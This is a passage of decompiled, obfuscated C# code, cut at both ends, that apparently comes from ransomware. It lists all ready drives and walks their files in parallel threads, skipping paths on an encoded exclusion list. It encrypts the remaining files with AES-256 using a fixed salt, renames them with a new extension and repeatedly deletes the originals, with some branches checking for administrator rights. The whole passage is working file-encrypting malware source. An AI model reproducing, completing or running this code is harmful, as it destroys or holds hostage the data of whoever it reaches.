			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !thizDxJzbdFr.Contains(array[i].Name))
					{
						thizDxJzbdFr.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!thizDxJzbdFr.Contains(string_0[j]))
				{
					thizDxJzbdFr.Add(string_0[j]);
				}
			}
		}
		if (thizDxJzbdFr.Contains(UMsFeqgmECpmMQw(getString_0(107389719))) && xJmSgvErkcgu == getString_0(107396768))
		{
			thizDxJzbdFr.Remove(UMsFeqgmECpmMQw(getString_0(107389719)));
		}
		Parallel.ForEach(thizDxJzbdFr, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new hslKqmAALJBlfcK.ljwynMyzEvwgD();
			CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.xBRwKYQOjQp = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				try
				{
					if (CqkoqGibgFXpfa == hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107396781) && CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407155)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp.Replace(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407155), hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407125)) + UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107396781) && !CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407155)) && CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp + hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407071) + UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407152)));
					}
					else if (CqkoqGibgFXpfa == hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107396781) && !CS_0024_003C_003E8__locals0.xBRwKYQOjQp.EndsWith(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107397151)))
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407182)), CS_0024_003C_003E8__locals0.xBRwKYQOjQp + hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407066) + UMsFeqgmECpmMQw(hslKqmAALJBlfcK.ljwynMyzEvwgD.getString_0(107407152)));
					}
				}
				catch
				{
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (wKqYuDCVvYLd && !QwrjqVpAtpM().Contains(hslKqmAALJBlfcK.getString_0(107390350)))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						HjhRarxRXLl(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xBRwKYQOjQp);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (kPvytyWmXkPBKlYej == hslKqmAALJBlfcK.getString_0(107396778))
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					swpHKLKUtiU(CS_0024_003C_003E8__locals0.xBRwKYQOjQp, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.CYhMazIAaeOTM, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.TuyIOFIBHopjl, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.ionjNPkCCEVsfJ, CS_0024_003C_003E8__locals0.fdWkrHZwlDUdv.weIWMSlCLCiXZYm);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				swpHKLKUtiU(CS_0024_003C_003E8__locals0.xBRwKYQOjQp, CS_0024_003C_003E8__locals0.CYhMazIAaeOTM, CS_0024_003C_003E8__locals0.TuyIOFIBHopjl, CS_0024_003C_003E8__locals0.ionjNPkCCEVsfJ, CS_0024_003C_003E8__locals0.weIWMSlCLCiXZYm);
			}
		});
	}

	public static void swpHKLKUtiU(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107392368));
		List<string> list3 = list2;
		if (fNFwbvvmkpHs == getString_0(107396225))
		{
			if (esygzjBYVPopS == getString_0(107396768) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ulqCrCCNbcfUQk(string_0))
			{
				mGyfBOrowLPD mGyfBOrowLPD = null;
				try
				{
					mGyfBOrowLPD = new mGyfBOrowLPD(string_0.Replace(getString_0(107397138), getString_0(107392368)));
				}
				catch
				{
					list = UAZMQOYQxIr(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					ohQxWeMSXPVib(mGyfBOrowLPD.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = UAZMQOYQxIr(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = UAZMQOYQxIr(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = QUDWPNEYUv.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0457;
					}
				}
				if ((DoGzWEXZVfOnAZf == getString_0(107396225) && !item.EndsWith(text)) || yPXLGtMRJTLFe.Contains(item))
				{
					continue;
				}
				if (PvdtfERdGevF == getString_0(107396768))
				{
					try
					{
						if (ickXCsmotx.pFtHqxtrIwxvy(item))
						{
							ickXCsmotx.nkIKigGZKzcDmh(item);
						}
					}
					catch
					{
					}
				}
				yPXLGtMRJTLFe.Add(item);
				if (!NnXnVroauy.Contains(Path.GetDirectoryName(item)))
				{
					NnXnVroauy.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (KFmKhFFHYbFap == getString_0(107396768) && fileStream.Length > Convert.ToInt32(FSmYeUMoln) * 1024 * 1024 && !list3.Contains(text))
					{
						if (YeRjXesflK == getString_0(107396768))
						{
							foreach (string item2 in tdGoFrmZRSDgex)
							{
								if (item.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == getString_0(107396768))
								{
									if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == getString_0(107396225))
								{
									try
									{
										ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = mYdJdJnIkYOjBSNk.SWdoFjhxOTmB(item, Convert.ToInt32(FSmYeUMoln) * 1024 * 1024);
						byte[] jWrCeXmSuYcDoj = mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						mYdJdJnIkYOjBSNk.MXdhDIMXmDxxv(item, jWrCeXmSuYcDoj);
						if (string_2 != getString_0(107389678))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389678))
					{
						yCjjCxcOUQYg(item, item + string_2, UCLDIbRwOFSI);
					}
					else
					{
						yCjjCxcOUQYg(item, item + getString_0(107389673), UCLDIbRwOFSI);
					}
				}
				catch (Exception)
				{
				}
				IL_0457:;
			}
		}
	}

	public static void ohQxWeMSXPVib(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		unSYKVUbmHblH CS_0024_003C_003E8__locals0 = new unSYKVUbmHblH();
		CS_0024_003C_003E8__locals0.BCVMqJLrqel = list_0;
		CS_0024_003C_003E8__locals0.lRlLhwhTyPu = string_1;
		CS_0024_003C_003E8__locals0.tFHuYftOgGEqEKMA = string_2;
		CS_0024_003C_003E8__locals0.mHfWrQyDyHEP = string_3;
		CS_0024_003C_003E8__locals0.BUMYlfmNBJHo = new List<string> { getString_0(107392368) };
		if (DoGzWEXZVfOnAZf == getString_0(107396225))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.BCVMqJLrqel)
				{
					if (!item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391652)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391663)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391618)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391637)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392092)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392071)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392058)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392077)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392040)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391999)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107392014)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391969)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391980)) && !item.Contains(unSYKVUbmHblH.getString_0(107391955)) && !item.Contains(unSYKVUbmHblH.getString_0(107391906)) && !item.Contains(unSYKVUbmHblH.getString_0(107391921)) && !item.Contains(unSYKVUbmHblH.getString_0(107391872)) && !item.Contains(unSYKVUbmHblH.getString_0(107391887)) && !item.Contains(unSYKVUbmHblH.getString_0(107391326)) && !item.Contains(unSYKVUbmHblH.getString_0(107391341)) && !item.Contains(unSYKVUbmHblH.getString_0(107391292)) && !item.Contains(unSYKVUbmHblH.getString_0(107391311)) && !item.Contains(unSYKVUbmHblH.getString_0(107391258)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391277)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391232)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391247)) && !item.ToLower().Contains(unSYKVUbmHblH.getString_0(107391198)) && !item.Contains(UMsFeqgmECpmMQw(unSYKVUbmHblH.getString_0(107391213))) && !item.Contains(unSYKVUbmHblH.getString_0(107391188)) && !item.Contains(unSYKVUbmHblH.getString_0(107391143)) && !item.EndsWith(unSYKVUbmHblH.getString_0(107407067)) && !item.EndsWith(unSYKVUbmHblH.getString_0(107391146)) && !item.EndsWith(unSYKVUbmHblH.getString_0(107391109)) && !item.EndsWith(unSYKVUbmHblH.getString_0(107391104)) && !item.EndsWith(unSYKVUbmHblH.getString_0(107391099)) && !item.Contains(unSYKVUbmHblH.getString_0(107391126)) && !item.Contains(vRtRaLVWxUWQ) && !item.Contains(XTpFtiqHigTwzn) && !item.Contains(oVFLPykEyliA))
					{
						if (CS_0024_003C_003E8__locals0.tFHuYftOgGEqEKMA.Length != 0)
						{
							string[] tFHuYftOgGEqEKMA2 = CS_0024_003C_003E8__locals0.tFHuYftOgGEqEKMA;
							int num2 = 0;
							while (num2 < tFHuYftOgGEqEKMA2.Length)
							{
								string value2 = tFHuYftOgGEqEKMA2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_09c1;
							}
						}
						if (item.EndsWith(string_0) && !yPXLGtMRJTLFe.Contains(item))
						{
							if (PvdtfERdGevF == unSYKVUbmHblH.getString_0(107396787))
							{
								try
								{
									if (ickXCsmotx.pFtHqxtrIwxvy(item))
									{
										ickXCsmotx.nkIKigGZKzcDmh(item);
									}
								}
								catch
								{
								}
							}
							yPXLGtMRJTLFe.Add(item);
							if (!NnXnVroauy.Contains(Path.GetDirectoryName(item)))
							{
								NnXnVroauy.Add(Path.GetDirectoryName(item));
							}
							AXKQsmCJUmCYzKL(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0505;
									}
									goto end_IL_0505_2;
									end_IL_0505:;
								}
								catch (Exception ex6)
								{
									if (TfpcYTfYwiZ)
									{
										try
										{
											File.AppendAllText(XTpFtiqHigTwzn, unSYKVUbmHblH.getString_0(107390461) + item + unSYKVUbmHblH.getString_0(107407086) + ex6.Message + unSYKVUbmHblH.getString_0(107396608));
										}
										catch (Exception)
										{
										}
									}
									goto end_IL_0505_2;
								}
								if (KFmKhFFHYbFap == unSYKVUbmHblH.getString_0(107396787) && new FileInfo(item).Length > Convert.ToInt32(FSmYeUMoln) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.BUMYlfmNBJHo.Contains(string_0))
								{
									try
									{
										if (CS_0024_003C_003E8__locals0.lRlLhwhTyPu != unSYKVUbmHblH.getString_0(107389697))
										{
											File.Move(item, item + CS_0024_003C_003E8__locals0.lRlLhwhTyPu);
										}
									}
									catch (Exception ex8)
									{
										if (!TfpcYTfYwiZ)
										{
											break;
										}
										try
										{
											File.AppendAllText(XTpFtiqHigTwzn, unSYKVUbmHblH.getString_0(107390461) + item + unSYKVUbmHblH.getString_0(107407025) + ex8.Message + unSYKVUbmHblH.getString_0(107396608));
											break;
										}
										catch (Exception)
										{
											break;
										}
									}
									string text2 = item + CS_0024_003C_003E8__locals0.lRlLhwhTyPu;
									if (YeRjXesflK == unSYKVUbmHblH.getString_0(107396787))
									{
										foreach (string item2 in tdGoFrmZRSDgex)
										{
											if (text2.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == unSYKVUbmHblH.getString_0(107396787))
											{
												if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > new FileInfo(text2).Length)
												{
													try
													{
														ZTOrHfhPbpGY.etRpUbdkuxt(unSYKVUbmHblH.getString_0(107392500), unSYKVUbmHblH.getString_0(107392495), unSYKVUbmHblH.getString_0(107392450), text2);
													}
													catch
													{
													}
												}
											}
											else if (text2.ToLower().EndsWith(item2) && ZmtAmSRTqWRL == unSYKVUbmHblH.getString_0(107396244))
											{
												try
												{
													ZTOrHfhPbpGY.etRpUbdkuxt(unSYKVUbmHblH.getString_0(107392500), unSYKVUbmHblH.getString_0(107392495), unSYKVUbmHblH.getString_0(107392450), text2);
												}
												catch
												{
												}
											}
										}
									}
									string text3 = RhHGGkxKaJlh.PesTFjBOVNb(32);
									string s2 = vMIKiIwtveyB.GfpVZvWzMIElkKF(text3);
									byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
									if (ifyYfKFnqSzZyvn == unSYKVUbmHblH.getString_0(107396244))
									{
										byte[] array2 = null;
										byte[] byte_2 = mYdJdJnIkYOjBSNk.SWdoFjhxOTmB(text2, Convert.ToInt32(FSmYeUMoln) * 1024 * 1024);
										array2 = ((!KzojBHDhTMmk) ? (dKfSpybLYvFvyKv ? mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dKfSpybLYvFvyKv ? YeMtRiUfWWXgoc.zyKaParKlJQ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YeMtRiUfWWXgoc.zyKaParKlJQ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
										mYdJdJnIkYOjBSNk.MXdhDIMXmDxxv(text2, array2, bytes2);
									}
									else if (!dKfSpybLYvFvyKv)
									{
										JyNvffrllaXO.cwEdRCAtuf(text2, FSmYeUMoln, CS_0024_003C_003E8__locals0.mHfWrQyDyHEP);
									}
									else
									{
										JyNvffrllaXO.cwEdRCAtuf(text2, FSmYeUMoln, text3, bytes2);
									}
								}
								else
								{
									if (CS_0024_003C_003E8__locals0.lRlLhwhTyPu != unSYKVUbmHblH.getString_0(107389697))
									{
										VuDswLdYmspn(item, item + CS_0024_003C_003E8__locals0.lRlLhwhTyPu, UCLDIbRwOFSI);
									}
									else
									{
										VuDswLdYmspn(item, item + unSYKVUbmHblH.getString_0(107389692), UCLDIbRwOFSI);
									}
									if (dKfSpybLYvFvyKv)
									{
										LvqQiyYFTFKfLYz(item + CS_0024_003C_003E8__locals0.lRlLhwhTyPu, Encoding.ASCII.GetBytes(oUoqPtPNHwCatJ));
									}
								}
								goto IL_09c1;
								end_IL_0505_2:;
							}
							catch (Exception)
							{
								goto IL_09c1;
							}
						}
					}
					continue;
					IL_09c1:
					CS_0024_003C_003E8__locals0.BCVMqJLrqel.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.BCVMqJLrqel, delegate(string string_0)
		{
			if (!string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391652)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391663)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391618)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391637)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392092)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392071)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392058)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392077)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392040)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391999)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107392014)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391969)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391980)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391955)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391906)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391921)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391872)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391887)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391326)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391341)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391292)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391311)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391258)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391277)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391232)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391247)) && !string_0.ToLower().Contains(unSYKVUbmHblH.getString_0(107391198)) && !string_0.Contains(UMsFeqgmECpmMQw(unSYKVUbmHblH.getString_0(107391213))) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391188)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391143)) && !string_0.EndsWith(unSYKVUbmHblH.getString_0(107407067)) && !string_0.EndsWith(unSYKVUbmHblH.getString_0(107391146)) && !string_0.EndsWith(unSYKVUbmHblH.getString_0(107391109)) && !string_0.EndsWith(unSYKVUbmHblH.getString_0(107391104)) && !string_0.EndsWith(unSYKVUbmHblH.getString_0(107391099)) && !string_0.Contains(unSYKVUbmHblH.getString_0(107391126)) && !string_0.Contains(vRtRaLVWxUWQ) && !string_0.Contains(XTpFtiqHigTwzn) && !string_0.Contains(oVFLPykEyliA))
			{
				if (CS_0024_003C_003E8__locals0.tFHuYftOgGEqEKMA.Length != 0)
				{
					string[] tFHuYftOgGEqEKMA = CS_0024_003C_003E8__locals0.tFHuYftOgGEqEKMA;
					int num = 0;
					while (num < tFHuYftOgGEqEKMA.Length)
					{
						string value = tFHuYftOgGEqEKMA[num];
						if (!string_0.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_097d;
					}
				}
				if (!yPXLGtMRJTLFe.Contains(string_0))
				{
					if (PvdtfERdGevF == unSYKVUbmHblH.getString_0(107396787))
					{
						try
						{
							if (ickXCsmotx.pFtHqxtrIwxvy(string_0))
							{
								ickXCsmotx.nkIKigGZKzcDmh(string_0);
							}
						}
						catch
						{
						}
					}
					yPXLGtMRJTLFe.Add(string_0);
					if (!NnXnVroauy.Contains(Path.GetDirectoryName(string_0)))
					{
						NnXnVroauy.Add(Path.GetDirectoryName(string_0));
					}
					AXKQsmCJUmCYzKL(string_0);
					try
					{
						try
						{
							if (new FileInfo(string_0).Length != 0L)
							{
								goto end_IL_04de;
							}
							goto end_IL_04de_2;
							end_IL_04de:;
						}
						catch (Exception ex)
						{
							if (TfpcYTfYwiZ)
							{
								try
								{
									File.AppendAllText(XTpFtiqHigTwzn, unSYKVUbmHblH.getString_0(107390461) + string_0 + unSYKVUbmHblH.getString_0(107407086) + ex.Message + unSYKVUbmHblH.getString_0(107396608));
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_04de_2;
						}
						if (KFmKhFFHYbFap == unSYKVUbmHblH.getString_0(107396787) && new FileInfo(string_0).Length > Convert.ToInt32(FSmYeUMoln) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.lRlLhwhTyPu != unSYKVUbmHblH.getString_0(107389697))
								{
									File.Move(string_0, string_0 + CS_0024_003C_003E8__locals0.lRlLhwhTyPu);
								}
							}
							catch (Exception ex3)
							{
								if (TfpcYTfYwiZ)
								{
									try
									{
										File.AppendAllText(XTpFtiqHigTwzn, unSYKVUbmHblH.getString_0(107390461) + string_0 + unSYKVUbmHblH.getString_0(107407025) + ex3.Message + unSYKVUbmHblH.getString_0(107396608));
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							string_0 += CS_0024_003C_003E8__locals0.lRlLhwhTyPu;
							if (YeRjXesflK == unSYKVUbmHblH.getString_0(107396787))
							{
								foreach (string item3 in tdGoFrmZRSDgex)
								{
									if (string_0.ToLower().EndsWith(item3) && ZmtAmSRTqWRL == unSYKVUbmHblH.getString_0(107396787))
									{
										if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > new FileInfo(string_0).Length)
										{
											try
											{
												ZTOrHfhPbpGY.etRpUbdkuxt(unSYKVUbmHblH.getString_0(107392500), unSYKVUbmHblH.getString_0(107392495), unSYKVUbmHblH.getString_0(107392450), string_0);
											}
											catch
											{
											}
										}
									}
									else if (string_0.ToLower().EndsWith(item3) && ZmtAmSRTqWRL == unSYKVUbmHblH.getString_0(107396244))
									{
										try
										{
											ZTOrHfhPbpGY.etRpUbdkuxt(unSYKVUbmHblH.getString_0(107392500), unSYKVUbmHblH.getString_0(107392495), unSYKVUbmHblH.getString_0(107392450), string_0);
										}
										catch
										{
										}
									}
								}
							}
							string text = RhHGGkxKaJlh.PesTFjBOVNb(32);
							string s = vMIKiIwtveyB.GfpVZvWzMIElkKF(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (ifyYfKFnqSzZyvn == unSYKVUbmHblH.getString_0(107396244))
							{
								byte[] array = null;
								byte[] byte_ = mYdJdJnIkYOjBSNk.SWdoFjhxOTmB(string_0, Convert.ToInt32(FSmYeUMoln) * 1024 * 1024);
								array = ((!KzojBHDhTMmk) ? (dKfSpybLYvFvyKv ? mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dKfSpybLYvFvyKv ? YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mHfWrQyDyHEP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
								mYdJdJnIkYOjBSNk.MXdhDIMXmDxxv(string_0, array, bytes);
							}
							else if (!dKfSpybLYvFvyKv)
							{
								JyNvffrllaXO.cwEdRCAtuf(string_0, FSmYeUMoln, CS_0024_003C_003E8__locals0.mHfWrQyDyHEP);
							}
							else
							{
								JyNvffrllaXO.cwEdRCAtuf(string_0, FSmYeUMoln, text, bytes);
							}
						}
						else
						{
							if (CS_0024_003C_003E8__locals0.lRlLhwhTyPu != unSYKVUbmHblH.getString_0(107389697))
							{
								VuDswLdYmspn(string_0, string_0 + CS_0024_003C_003E8__locals0.lRlLhwhTyPu, UCLDIbRwOFSI);
							}
							else
							{
								VuDswLdYmspn(string_0, string_0 + unSYKVUbmHblH.getString_0(107389692), UCLDIbRwOFSI);
							}
							if (dKfSpybLYvFvyKv)
							{
								LvqQiyYFTFKfLYz(string_0 + CS_0024_003C_003E8__locals0.lRlLhwhTyPu, Encoding.ASCII.GetBytes(oUoqPtPNHwCatJ));
							}
						}
						end_IL_04de_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_097d;
			IL_097d:
			CS_0024_003C_003E8__locals0.BCVMqJLrqel.Remove(string_0);
		});
	}

	private static void yCjjCxcOUQYg(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (YeRjXesflK == getString_0(107396768))
					{
						foreach (string item in tdGoFrmZRSDgex)
						{
							if (string_0.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396768))
							{
								if (Convert.ToInt32(PXbtmkwFEcS) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && ZmtAmSRTqWRL == getString_0(107396225))
							{
								try
								{
									ZTOrHfhPbpGY.etRpUbdkuxt(getString_0(107392481), getString_0(107392476), getString_0(107392431), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107389673)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107389673), getString_0(107392368)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void VuDswLdYmspn(string string_0, string string_1, byte[] byte_0)
	{
		bBZqHdCrBaerAZ CS_0024_003C_003E8__locals0 = new bBZqHdCrBaerAZ();
		CS_0024_003C_003E8__locals0.vYqAcfieYkUdqlaV = string_0;
		CS_0024_003C_003E8__locals0.kZerlxSVnfjP = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string kZerlxSVnfjP = CS_0024_003C_003E8__locals0.kZerlxSVnfjP;
			FileStream fileStream = new FileStream(kZerlxSVnfjP, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
